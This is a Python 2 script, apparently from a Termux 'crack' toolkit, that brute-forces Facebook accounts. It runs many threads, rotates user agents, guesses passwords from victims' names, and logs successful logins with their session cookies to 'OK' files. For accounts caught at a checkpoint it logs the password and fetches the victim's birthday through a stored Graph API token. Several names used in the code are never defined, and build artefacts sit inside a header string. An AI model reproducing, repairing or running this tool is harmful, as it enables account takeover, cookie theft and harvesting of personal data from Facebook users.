#!/usr/bin/python2
#-*-coding:utf-8-*-

import os
import re
import sys
import bs4
import time
import json
import uuid
import random
import urllib
import hashlib
import datetime
import calendar
import requests
import ipaddress
import mechanize
import threading
from time import sleep
from datetime import date
from datetime import datetime
from bs4 import BeautifulSoup as parser
import itertools,hashlib,threading,getpass
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor


sys.getdefaultencoding()
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jala(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(0.0001)
def clear():
 os.system("clear")
def banner():
 jala ('''
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                              
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫''')
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
rgb = random.choice(['\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0;97m', '\x1b[0m'])
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
user_agent = [
'Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ',
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214',
'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1',
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723',
'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807',
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01',
'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672',
'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta',
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2',
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01',
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807',
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10',
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226',
'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 
'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 
'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 
'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 
'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 
'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 
'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 
'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 
'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 
'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 
'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 
'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 
'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 
'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807'
]
ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ho = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ho, op, ta))
tgl = ("%s %s %s"%(ho, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
	
def brute():
        raw_input('\nENTER to CRACK')
        try:
            path = r'/data/data/com.termux/files/home/fb'
            self.apk = random.choice(glob.glob(path + r'/*.txt'))
            self.id = open(self.apk).read().splitlines()
            print('\nFile: %s'%(self.apk))
        except:
            print('\nCOMPLETE')
            os.sys.exit()
        jalan;time.sleep(0.2)
        with NeMo(max_workers=30) as (__nemoXD__):
            for omen in self.id:
                try:
                    uid, name = omen.split('<=>')
                    x, y = name.split(' ')
                    if len(x) == 3 or len(x) == 4 or len(x) == 5 or len(x) == 6:
                        pwx = [x+" "+y, x+"123", x+"12345", x+"1234", y+"123"]
                    else:
                        pwx = [x+" "+y, x+"123", y+"123"]
                    __nemoXD__.submit(crack, uid, pwx)
                except:
                    pass

        os.remove(self.apk);time.sleep(2)
        os.sys.exit()

def crack(uid, pwx):
	ua = random.choice(user_agent)
	global ok, cp, loop, token
	sys.stdout.write(
		"\r┣[*❯  crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+uid).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1


if __name__ == "__main__":
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	brute()
	
